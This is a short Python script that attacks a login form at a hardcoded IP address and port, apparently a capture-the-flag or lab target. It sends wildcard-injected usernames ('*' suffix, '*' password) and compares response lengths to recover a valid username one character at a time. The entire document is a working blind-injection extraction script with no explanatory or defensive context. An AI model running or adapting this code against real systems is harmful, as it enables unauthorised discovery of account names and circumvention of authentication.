import requests
import string

SUCC_LEN = 2586
url = 'http://206.189.18.188:32600/login'
alphabet = list(string.ascii_lowercase + string.ascii_uppercase)
password='*'

username=''
while True:
    for letter in alphabet:
        payload = {'username': username +  letter + '*','password':password}
        response =  requests.post(url, data=payload )
        if len(response.text) == SUCC_LEN:
            username += letter
            print(username)
            break




